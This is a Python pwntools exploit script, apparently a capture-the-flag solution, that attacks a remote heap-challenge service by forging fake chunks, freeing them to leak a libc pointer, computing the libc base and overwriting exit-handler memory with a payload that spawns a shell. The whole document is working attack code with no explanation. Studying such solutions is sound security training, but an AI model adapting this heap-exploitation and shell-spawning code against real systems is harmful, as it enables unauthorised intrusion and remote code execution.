from pwn import *

HOST, PORT = "arcade.fluxfingers.net", 1810
# HOST, PORT = "172.17.0.2", 31338

context.log_level = 'error'

try:
	locals_libc
	remote_libc
except:
	# locals_libc = ELF('Downloads/libc.so.6')
	if HOST == 'arcade.fluxfingers.net' or 1:
		initial = 0x1bfbe8
		arena = 0x1bea00
	else:
		initial = 0x3ecd80
		arena = 0x3ebc00

menu = lambda: r.recvuntil("exit")
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[1]

c = lambda: r.recvuntil('?\n')

def write(offset, content):
	ii(1)
	ii(len(content))
	ii(offset)
	r.send(content)

def free(offset):
	ii(2)
	ii(offset)

def leak(offset):
	ii(3)
	ii(offset)
	r.recvuntil('leak?\n')
	data = r.recvuntil('\nPlease', drop=True)
	return data

def leakptr(offset):
	return u64(leak(offset).ljust(8, '\x00'))

@MemLeak
def leak_by_address(address):
	write(0x1008, p64(address))
	return leak(0x1008) + '\x00'

while True:
	r = remote(HOST, PORT)
	heap = 0x10000
	ii(heap)
	chunk = p64(0x91) + 'a' * 0x88 + p64(0x21) + p64(0) * 3 + p64(1)
	chunk_small = p64(0x21) + 'a' * 0x18 + p64(0x21) + p64(0) * 3 + p64(1)
	size = 0xa0
	skip = False
	for i in range(8):
		write(size * i + 8, chunk)
		free(size * i + 16)
		if i == 2:
			ptr = leakptr(0xa0*2+16)
			print hex(ptr)

	if skip:
		r.close()
		continue
	cmd = 'echo pwned'
	write(0x10, cmd + '\x00')
	ptr = leakptr(0xa0*7+0x10+1)*0x100
	print hex(ptr)
	libc = (ptr - arena) & ~0xfff
	print hex(libc)
	ii(1)
	ii(0x20001)
	target = libc + initial - 8
	ii(target - heap)
	pc = libc + 0x45380
	pause()
	r.send(fit({0x1ffff: '\x00', 0: 'sh\x00', 8: p64(1), 2864 + 8 + 8: p64(0), 22848 + 8: p64(0), 13984 + 8: p64(0), 2148: p32(0), 2144: p32(0), 2920: p64(pc), 14656: p64(0), 4864: p64(0)}, filler='\x00'))
	r.interactive()
	break
